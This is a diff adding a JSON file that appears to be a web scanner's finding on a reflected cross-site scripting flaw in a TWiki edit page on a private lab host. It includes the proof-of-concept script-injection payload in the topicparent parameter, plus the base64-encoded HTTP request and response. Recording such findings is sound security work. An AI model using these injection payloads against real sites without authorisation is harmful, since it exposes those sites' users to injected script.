@@ -1,0 +1,78 @@
+{
+  "name": "Cross-site scripting (reflected)",
+  "type": "vulnerability",
+  "severity": "High",
+  "confidence": "Certain",
+  "host": "",
+  "path": "/twiki/bin/edit/Sandbox/TestTopic1",
+  "url": "/twiki/bin/edit/Sandbox/TestTopic1",
+  "evidence": [
+    {
+      "type": "FirstOrderEvidence",
+      "detail": {
+        "payload": {
+          "bytes": "YXpjYnAiPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD5scWgyYQ==",
+          "flags": 4
+        },
+        "band_flags": [
+          "in_band"
+        ]
+      },
+      "request_response": {
+        "url": "http://192.168.1.50/twiki/bin/edit/Sandbox/TestTopic1?topicparent=Sandbox.WebHomeazcbp%22%3e%3cscript%3ealert(1)%3c%2fscript%3elqh2a",
+        "request": [
+          {
+            "type": "DataSegment",
+            "data": "R0VUIC90d2lraS9iaW4vZWRpdC9TYW5kYm94L1Rlc3RUb3BpYzE/dG9waWNwYXJlbnQ9U2FuZGJveC5XZWJIb21l",
+            "length": 66
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "YXpjYnAlMjIlM2UlM2NzY3JpcHQlM2VhbGVydCgxKSUzYyUyZnNjcmlwdCUzZWxxaDJh",
+            "length": 51
+          },
+          {
+            "type": "DataSegment",
+            "data": "IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjEuNTANCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KU2VjLUNILVVBOiAiR29vZ2xlIENocm9tZSI7dj0iMTM4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMzgiDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KU2VjLUNILVVBLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS41MC90d2lraS9iaW4vdmlldy9TYW5kYm94L1dlYkhvbWUNCkNvbnRlbnQtTGVuZ3RoOiAwDQoNCg==",
+            "length": 745
+          }
+        ],
+        "response": [
+          {
+            "type": "DataSegment",
+            "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUdWUsIDAyIFNlcCAyMDI1IDE1OjAxOjQ4IEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjggKFVidW50dSkgREFWLzINCkV4cGlyZXM6IFdlZCwgMDMgU2VwIDIwMjUgMTU6MDE6NDggR01UDQpDYWNoZS1jb250cm9sOiBtYXgtYWdlPTg2NDAwDQpDb250ZW50LWxlbmd0aDogMzUyOA0KTGFzdC1Nb2RpZmllZDogVHVlLCAwMiBTZXAgMjAyNSAxNTowMTo0OCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xDQoNCjwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHhtbDpsYW5nPSJlbiIgbGFuZz0iZW4iPiAKPGhlYWQ+CiA8",
+            "length": 495
+          },
+          {
+            "type": "SnipSegment",
+            "length": 1801
+          },
+          {
+            "type": "DataSegment",
+            "data": "PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9waWNwYXJlbnQiIHZhbHVlPSJXZWJIb21l",
+            "length": 54
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "YXpjYnAiPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD5scWgyYQ==",
+            "length": 37
+          },
+          {
+            "type": "DataSegment",
+            "data": "IiAvJmd0Owo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjbWQiIHZhbHVlPSIiIC8+",
+            "length": 51
+          },
+          {
+            "type": "SnipSegment",
+            "length": 1385
+          }
+        ],
+        "was_redirect_followed": false,
+        "request_time": "672"
+      }
+    }
+  ],
+  "description": "The value of the <b>topicparent</b> request parameter is copied into the value of an HTML tag attribute which is encapsulated in double quotation marks. The payload <b>azcbp\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;lqh2a</b> was submitted in the topicparent parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.",
+  "remediation": "",
+  "references": []
+}
